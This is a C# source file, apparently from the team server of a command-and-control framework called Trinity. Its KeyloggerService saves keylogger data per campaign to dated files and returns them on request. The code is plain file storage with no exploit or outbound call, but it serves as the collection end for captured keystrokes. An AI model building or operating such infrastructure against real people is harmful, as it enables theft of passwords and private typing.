using TeamServer.Interface;
using Trinity.Shared.Errors;
using Trinity.Shared.Results;

namespace TeamServer.Services;

public sealed class KeyloggerService : IKeyloggerService
{
    private readonly string _filesDirectory;
    public KeyloggerService(IConfiguration configuration, IWebHostEnvironment environment)
    {
        var root = Path.GetFullPath(configuration["StoragePath"] ?? Path.Combine(environment.ContentRootPath, "storage"));
        _filesDirectory = Path.Combine(root, "files");
        Directory.CreateDirectory(_filesDirectory);
    }

    public async Task<Result<string>> SaveDataAsync(int campaignId, string data)
    {
        if (data is null)
        {
            return FileError.EmptyFile();
        }

        var campaignDirectory = Path.Combine(_filesDirectory, campaignId.ToString());
        Directory.CreateDirectory(campaignDirectory);
        var fileName = $"keylogger_data_{DateTime.UtcNow:yyyyMMdd}.txt";
        var filePath = Path.Combine(campaignDirectory, fileName);

        await File.AppendAllTextAsync(filePath, data);
        return fileName;
    }

    public async Task<Result<byte[]>> GetFileAsync(int campaignId, string fileName)
    {
        var safeFileName = Path.GetFileName(fileName);
        if (string.IsNullOrWhiteSpace(safeFileName) || safeFileName is "." or "..")
        {
            return FileError.FileNotFound(fileName);
        }

        var filePath = Path.Combine(_filesDirectory, campaignId.ToString(), safeFileName);
        if (!File.Exists(filePath))
        {
            return FileError.FileNotFound(safeFileName);
        }

        return await File.ReadAllBytesAsync(filePath);
    }
}
